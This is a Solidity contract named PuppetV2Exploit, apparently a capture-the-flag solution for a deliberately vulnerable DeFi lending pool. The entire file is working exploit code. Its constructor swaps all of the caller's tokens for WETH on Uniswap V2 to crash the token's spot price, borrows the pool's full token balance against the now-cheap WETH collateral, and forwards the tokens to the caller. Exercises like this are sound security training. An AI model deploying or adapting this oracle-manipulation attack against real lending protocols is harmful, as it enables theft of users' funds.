pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "hardhat/console.sol";
/**
 * @title PuppetV2Exploit
 * @author Jasmine Abtahi
 */
interface IWETH is IERC20 {
    function deposit() external payable;
}
interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external returns (uint256);
}
contract PuppetV2Exploit {

    address private uniswapPair;
    address private uniswapFactory;
    IERC20 private token;
    IWETH private weth;
    IUniswapV2Router02 public uniswapRouter;
    IPuppetV2Pool public pool;
    constructor(address _pool, address _uniswapRouter, address _token, address _weth) payable 
    public {
        pool = IPuppetV2Pool (_pool);
        token = IERC20(_token);
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        weth = IWETH(_weth);

        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
        attack(msg.sender);
    }

    function attack(address recipient) private {
        
        //exchanging tokens
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        token.approve(address(uniswapRouter), token.balanceOf(address(this)));
        uniswapRouter.swapExactTokensForTokens(token.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        uint256 amount = token.balanceOf(address(pool));
        uint256 collateral = pool.calculateDepositOfWETHRequired(amount);

        weth.deposit{value: address(this).balance}();
 
        weth.approve(address(pool), collateral);
        pool.borrow(amount);
        token.transfer(recipient, token.balanceOf(address(this)));
    } 

    //receive() external payable {}


}